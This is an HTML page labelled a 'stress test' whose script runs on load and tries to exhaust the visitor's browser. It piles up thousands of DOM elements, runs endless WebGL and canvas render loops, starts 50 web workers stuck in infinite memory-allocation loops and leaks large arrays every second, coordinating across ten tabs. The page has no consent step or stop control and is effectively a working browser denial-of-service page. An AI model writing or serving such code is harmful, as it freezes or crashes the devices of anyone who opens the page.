<!DOCTYPE html>
<html>
<head>
  <title>Glithex Hub - Stress Test</title>
  <style>
    body {
      margin: 0;
      background: #000;
      color: #0f0;
      font-family: monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    canvas { display: none; }
    #log { white-space: pre-line; text-align: center; }
  </style>
</head>
<body>
<div id="log"></div>

<script>
  let memoryLeak = [];
  const log = document.getElementById('log');

  function updateLog(message) {
    log.innerText = message;
  }

  // Check if all tabs are open and ready
  function checkAllTabsReady() {
    // Use localStorage to share state between tabs
    const openedTabs = parseInt(localStorage.getItem('openedTabs') || '0');
    const totalTabs = 10;  // Number of tabs expected to open

    if (openedTabs < totalTabs) {
      localStorage.setItem('openedTabs', openedTabs + 1);
      setTimeout(checkAllTabsReady, 1000);  // Check again in 1 second
    } else {
      // All tabs are ready, start the stress test
      setTimeout(startStressTest, 3000);  // 3-second delay before starting the stress test
    }
  }

  // ðŸŒ‹ Phase 1: DOM Bomb
  function DOMBomb() {
    updateLog("Starting DOM Bomb...");
    for (let i = 0; i < 5000; i++) { // Start with 5000 DOM elements
      const div = document.createElement('div');
      div.style.position = 'absolute';
      div.style.left = `${Math.random() * window.innerWidth}px`;
      div.style.top = `${Math.random() * window.innerHeight}px`;
      div.style.width = `${Math.random() * 200}px`;
      div.style.height = `${Math.random() * 200}px`;
      div.style.backgroundColor = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
      document.body.appendChild(div);
    }
  }

  // ðŸŒ‹ Phase 2: WebGL Fragment Shader Overload
  function WebGLFragmentShader() {
    updateLog("Starting WebGL Fragment Shader...");
    const canvas = document.createElement('canvas');
    canvas.width = 4096;
    canvas.height = 4096;
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return;

    const vertexShader = gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vertexShader, `
        attribute vec4 position;
        void main() {
            gl_Position = position;
        }
    `);
    gl.compileShader(vertexShader);

    const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fragmentShader, `
        precision highp float;
        uniform float time;
        void main() {
            gl_FragColor = vec4(sin(time) * 0.5 + 0.5, cos(time) * 0.5 + 0.5, 0.0, 1.0);
        }
    `);
    gl.compileShader(fragmentShader);

    const program = gl.createProgram();
    gl.attachShader(program, vertexShader);
    gl.attachShader(program, fragmentShader);
    gl.linkProgram(program);
    gl.useProgram(program);

    const position = gl.getAttribLocation(program, 'position');
    const buffer = gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 3, -1, -1, 3]), gl.STATIC_DRAW);
    gl.enableVertexAttribArray(position);
    gl.vertexAttribPointer(position, 2, gl.FLOAT, false, 0, 0);

    function render(time) {
        gl.uniform1f(gl.getUniformLocation(program, 'time'), time * 0.001);
        gl.drawArrays(gl.TRIANGLES, 0, 3);
        requestAnimationFrame(render);
    }
    render(0);
    document.body.appendChild(canvas);
  }

  // ðŸŒ‹ Phase 3: Launch Workers Gradually
  function launchWorkers(num) {
    updateLog("Starting Workers...");
    const code = `
        while (true) {
            let load = [];
            for (let i = 0; i < 5000; i++) { // Start with 5000 iterations
                load.push(new Array(5000).fill(Math.random())); // Each array is bigger
            }
        }
    `;
    const blob = new Blob([code], { type: "application/javascript" });
    const url = URL.createObjectURL(blob);
    for (let i = 0; i < num; i++) {
      new Worker(url);
    }
  }

  // ðŸŒ‹ Phase 4: Gradual Memory Leak
  function MemoryLeak() {
    updateLog("Starting Memory Leak...");
    setInterval(() => {
        memoryLeak.push(new Array(1000000).fill(Math.random())); // Larger arrays for leak
    }, 1000);  // Slower leak rate to prevent instant overload
  }

  // ðŸŒ‹ Phase 5: Canvas Rendering
  function IntensiveCanvasRendering() {
    updateLog("Starting Intensive Canvas Rendering...");
    const canvas = document.createElement('canvas');
    canvas.width = 4096;
    canvas.height = 4096;
    const ctx = canvas.getContext('2d');
    document.body.appendChild(canvas);

    function render() {
        ctx.fillStyle = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
        ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 200, 200);
        requestAnimationFrame(render);
    }
    render();
  }

  // ðŸŒ‹ Start Gradual Overload
  function startStressTest() {
    // Start phases one by one with delays
    setTimeout(() => DOMBomb(), 500);  // Delay for DOMBomb
    setTimeout(() => WebGLFragmentShader(), 2000);  // Delay for WebGL
    setTimeout(() => launchWorkers(50), 5000);  // Delay for workers
    setTimeout(() => MemoryLeak(), 8000);  // Delay for memory leak
    setTimeout(() => IntensiveCanvasRendering(), 12000);  // Delay for canvas rendering
  }

  // Start the tab checking process
  checkAllTabsReady();  // Start the checking process when the page loads
</script>
</body>
</html>
